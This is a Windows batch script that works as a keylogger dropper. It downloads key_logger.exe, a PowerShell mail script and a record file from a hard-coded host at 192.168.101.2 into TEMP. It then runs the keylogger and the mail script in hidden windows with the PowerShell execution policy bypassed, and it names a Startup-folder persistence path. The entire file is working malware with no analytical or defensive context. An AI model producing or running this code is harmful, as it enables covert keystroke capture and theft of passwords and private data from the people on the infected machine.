@echo off
setlocal

set "URL=http://192.168.101.2:80"

set "logger=key_logger.exe"
set "mail=ps_mail.ps1"
set "record=Record.txt"

set "fileTemp=%TEMP%"
set "fileStartupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\persistent.bat"

if not exist "%fileTemp%\logger.exe" (
    start powershell -Command "Invoke-WebRequest -Uri %URL%/%logger% -OutFile $env:TEMP\logger.exe"
)

if not exist "%fileTemp%\%mail%" (
    start powershell -Command "Invoke-WebRequest -Uri %URL%/%mail% -OutFile $env:TEMP\%mail%"
)

if not exist "%fileTemp%\%record%" (
    start powershell -Command "Invoke-WebRequest -Uri %URL%/%record% -OutFile $env:TEMP\%record%"
)

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"


endlocal
